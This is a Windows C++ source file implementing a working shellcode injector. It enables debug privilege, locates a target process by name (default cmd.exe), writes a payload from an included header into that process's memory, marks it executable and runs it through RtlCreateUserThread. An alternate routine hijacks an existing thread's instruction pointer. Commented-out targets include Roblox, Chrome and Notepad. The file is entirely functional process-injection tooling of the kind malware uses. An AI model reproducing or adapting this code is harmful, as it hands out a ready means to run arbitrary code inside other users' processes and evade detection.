
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <tchar.h>
#include <winternl.h>

#include "payload.h"

typedef NTSTATUS(NTAPI * pfnRtlCreateUserThread)(
		IN HANDLE ProcessHandle,
		IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
		IN BOOLEAN CreateSuspended,
		IN ULONG StackZeroBits OPTIONAL,
		IN SIZE_T StackReserve OPTIONAL,
		IN SIZE_T StackCommit OPTIONAL,
		IN PTHREAD_START_ROUTINE StartAddress,
		IN PVOID Parameter OPTIONAL,
		OUT PHANDLE ThreadHandle OPTIONAL,
		OUT PCLIENT_ID ClientId OPTIONAL);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
		IN  HANDLE ProcessHandle,
		IN  PROCESSINFOCLASS ProcessInformationClass,
		OUT PVOID ProcessInformation,
		IN  ULONG ProcessInformationLength,
		OUT PULONG ReturnLength    OPTIONAL
		);

// Enables SE_DEBUG_NAME so OpenProcess works against elevated targets
// (mirrors EnableDebugPrivilege() in ReflectiveDLLInjection/inject/src/Inject.c).
static BOOL EnableDebugPrivilege(void)
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	TOKEN_PRIVILEGES priv = {0};
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bResult = FALSE;
	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
	{
		// Proceed even if this fails; OpenProcess is the real gate.
		AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		bResult = (GetLastError() == ERROR_SUCCESS);
	}

	CloseHandle(hToken);
	return bResult;
}


BOOL ListProcessThreads( DWORD dwOwnerPID, void* pointer_after_allocated) 
{ 
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
	THREADENTRY32 te32; 

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
	if( hThreadSnap == INVALID_HANDLE_VALUE ) 
		return( FALSE ); 

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32 ); 

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if( !Thread32First( hThreadSnap, &te32 ) ) 
	{
		printf("Thread32First fail\n");
		CloseHandle( hThreadSnap );
		return( FALSE );
	}

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do 
	{ 
		if( te32.th32OwnerProcessID == dwOwnerPID )
		{
			printf("THREAD ID      = 0x%08lX\n", (unsigned long)te32.th32ThreadID); 
			printf("base priority  = %ld\n", (long)te32.tpBasePri ); 
			printf("delta priority = %ld\n", (long)te32.tpDeltaPri ); 

			HANDLE threadHijacked = NULL;
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);

			// Must zero-init and set ContextFlags or GetThreadContext fails.
			// CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER on both x64 and ARM64.
			CONTEXT context;
			ZeroMemory(&context, sizeof(context));
			context.ContextFlags = CONTEXT_FULL;
			DWORD result = SuspendThread(threadHijacked);
			printf("SuspendThread  = 0x%08lX\n", (unsigned long)result); 
			result = GetThreadContext(threadHijacked, &context);
#if defined(_M_ARM64) || defined(__aarch64__)
			printf("GetThreadContext  = 0x%08lX, pc = 0x%08llX\n", (unsigned long)result, (unsigned long long)context.Pc); 
			context.Pc = (DWORD_PTR)pointer_after_allocated;
#else
			printf("GetThreadContext  = 0x%08lX, rip = 0x%08llX\n", (unsigned long)result, (unsigned long long)context.Rip); 
			context.Rip = (DWORD_PTR)pointer_after_allocated;
#endif
			result = SetThreadContext(threadHijacked, &context);
			printf("SetThreadContext  = 0x%08lX\n", (unsigned long)result); 
			result = ResumeThread(threadHijacked);
			printf("ResumeThread  = 0x%08lX\n", (unsigned long)result); 
			break;
		}
	} while( Thread32Next(hThreadSnap, &te32 ) );

	//  Don't forget to clean up the snapshot object.
	CloseHandle( hThreadSnap );
	return( TRUE );
}


BOOL InjectShellcode(DWORD pID)
{
	HANDLE pHandle;

	do
	{
		if (!EnableDebugPrivilege())
			printf("[!] Failed to enable SeDebugPrivilege; injection into elevated processes may fail\n");
		/*HWND hGameWindow;*/
		/*hGameWindow = FindWindow(NULL, "Roblox");*/
		/*hGameWindow = FindWindow(NULL, "Untitled - Notepad");*/
		/*hGameWindow = FindWindow(NULL, "New Tab - Google Chrome");*/
		/*hGameWindow = FindWindow(NULL, "C:\\Windows\\SysWOW64\\cmd.exe");*/
		/*printf("[+] hGameWindow %p\n", hGameWindow);*/
		/*GetWindowThreadProcessId(hGameWindow, &pID);*/

		pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
		printf("[+] pHandle %p\n", pHandle);

		if (pHandle==NULL)
		{ 
			printf("[-]Error while open the process\n");
			return FALSE;

		}else{
			printf("[+] Process Opened sucessfully (%p)\n", (void*)pHandle);
		}
		// Allocate RW, write the shellcode, then flip to RX (W^X friendly).
		LPVOID pointer_after_allocated = VirtualAllocEx(pHandle, NULL , sizeof(windows_payload_bin), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if(pointer_after_allocated==NULL){
			printf("[-]Error while get the base address to write\n");
			return FALSE;
		}else{
			printf("[+] Got the address to write %p\n", pointer_after_allocated);
		}
		if(WriteProcessMemory(pHandle, (LPVOID)pointer_after_allocated, (LPCVOID)windows_payload_bin, sizeof(windows_payload_bin), 0)){
			/*ListProcessThreads(pID, pointer_after_allocated);*/

			DWORD dwOldProtect = 0;
			if (!VirtualProtectEx(pHandle, pointer_after_allocated, sizeof(windows_payload_bin), PAGE_EXECUTE_READ, &dwOldProtect)) {
				printf("[-] VirtualProtectEx(PAGE_EXECUTE_READ) failed %lu\n", (unsigned long)GetLastError());
				CloseHandle(pHandle);
				return FALSE;
			}

			pfnRtlCreateUserThread RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
			printf("[+] Running the shellcode as new thread %p !\n", RtlCreateUserThread);
			CLIENT_ID client_id;
			HANDLE ThreadHandle = NULL;
			NTSTATUS Status = RtlCreateUserThread(pHandle, NULL, FALSE, 0, 0, 0, (PTHREAD_START_ROUTINE)pointer_after_allocated, NULL, &ThreadHandle, &client_id);
			if ((Status < 0) || ThreadHandle == NULL)
			{
				printf("[-] Not Injected\n");
				CloseHandle(pHandle);
				return FALSE;
			}
			printf("[+] Injected\n");
			if (WaitForSingleObject(ThreadHandle, 10000) == WAIT_FAILED)
			{
				return FALSE;
			}
			printf("[+] Finished\n");
			CloseHandle(ThreadHandle);
			CloseHandle(pHandle);
			return TRUE;
		}else{
			printf("[-] Not Injected\n");
			return FALSE;
		}
		CloseHandle(pHandle);
	} while(0);

	return FALSE;
}


BOOL ScanProcessList(const char *target_name)
{
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	HMODULE hNtDll = LoadLibraryA("ntdll.dll");
	if(hNtDll == NULL) return FALSE;

	pfnNtQueryInformationProcess gNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll,
			"NtQueryInformationProcess");

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE )
	{
		FreeLibrary(hNtDll);
		return( FALSE );
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof( PROCESSENTRY32 );

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if( !Process32First( hProcessSnap, &pe32 ) )
	{
		CloseHandle( hProcessSnap );          // clean the snapshot object
		FreeLibrary(hNtDll);
		return( FALSE );
	}

	printf("Scanning processes for %s...\n", target_name);
	PROCESS_BASIC_INFORMATION BasicInformation           = {0};
	RTL_USER_PROCESS_PARAMETERS params                   = {0};
	_PEB peb                                             = {0};
	DWORD dwSize = 0;

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do
	{
		if (_stricmp(pe32.szExeFile, target_name) != 0) {
			continue;
		}

		/*printf("exe file %s\n", pe32.szExeFile);*/

		hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
		if( hProcess == NULL )
			continue;

		if( gNtQueryInformationProcess( hProcess, (PROCESSINFOCLASS)0, &BasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &dwSize ) != 0 ) {
			CloseHandle( hProcess );
			continue;
		}

		if( !BasicInformation.PebBaseAddress )
		{
			CloseHandle( hProcess );
			continue;
		}

		if( !ReadProcessMemory( hProcess, BasicInformation.PebBaseAddress, &peb, 64, NULL ) )
		{
			CloseHandle( hProcess );
			continue;
		}

		if( !peb.ProcessParameters )
		{
			CloseHandle( hProcess );
			continue;
		}

		if( !ReadProcessMemory( hProcess, peb.ProcessParameters, &params, sizeof(params), NULL ) )
		{
			CloseHandle( hProcess );
			continue;
		}

		// Allocate Length + terminator: CommandLine.Length excludes the NUL.
		wchar_t* wcpExePath = (wchar_t*)calloc(1, params.CommandLine.Length + sizeof(wchar_t));
		if( ReadProcessMemory( hProcess, params.CommandLine.Buffer, wcpExePath, params.CommandLine.Length, NULL ) )
		{
			// Remove the renderer check for notepad testing
			wprintf(L"pid %d cl: %ls\n", pe32.th32ProcessID, wcpExePath);
			if (InjectShellcode(pe32.th32ProcessID)) {
				free(wcpExePath);
				CloseHandle( hProcess );
				break;
			}
		}
		free(wcpExePath);

		CloseHandle( hProcess );

	} while( Process32Next( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	FreeLibrary(hNtDll);
	return( TRUE );
}

int main(int argc, char **argv)
{
	const char *target_name = (argc > 1) ? argv[1] : "cmd.exe";
	freopen("C:\\Users\\Public\\inject.log", "w", stdout);
	freopen("C:\\Users\\Public\\inject_err.log", "w", stderr);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
	ScanProcessList(target_name);
	fclose(stdout);
	fclose(stderr);
	return 0;
}

